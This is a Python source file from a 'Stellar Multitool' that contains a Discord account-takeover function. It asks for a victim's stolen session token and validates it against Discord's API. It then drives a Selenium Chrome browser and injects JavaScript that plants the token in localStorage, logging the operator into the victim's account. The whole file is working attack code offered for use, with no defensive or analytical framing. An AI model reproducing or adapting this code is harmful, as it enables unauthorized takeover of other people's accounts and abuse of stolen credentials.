# Stellar Multitool is proudly coded by @swedewtf, @rinfys and @crxelty (no longer active)
# Multitool maintained/updated by @swedewtf and @rinfys

from colorama import Fore, Style, init
init(convert=True)
from util.plugins.pluh import *

red = Fore.RED + Style.BRIGHT
green = Fore.GREEN + Style.BRIGHT
blue = Fore.BLUE + Style.BRIGHT
white = Fore.WHITE

from selenium import webdriver
def __tokenlogin__():
  token = input("Enter your victims token: ")
  tokencheck(token)
  headers = {
        "Authorization": token,
        "Content-Type": "application/json",
  }
  info = requests.get("https://discord.com/api/v9/users/@me", headers=headers).json()
  user = info["username"] + "#" + str(info["discriminator"])
  options = webdriver.ChromeOptions()
  options.add_experimental_option('excludeSwitches', ['enable-logging'])
  options.add_experimental_option("detach", True)
  driver = webdriver.Chrome(options=options, keep_alive=True)
  driver.get("https://discord.com/login")
  js_code = f'''
  let token = "{token}";''' + """
  
  function login(token) {
      setInterval(() => {
        document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
      }, 50);
      setTimeout(() => {
        location.reload();
      }, 2500);
    }
  
  login(token);"""
  slowprint(f"{green}Logging into {user}!{blue}")
  driver.execute_script(js_code)
  input("\nPress anything to continue...")
  __import__("Stellar").main()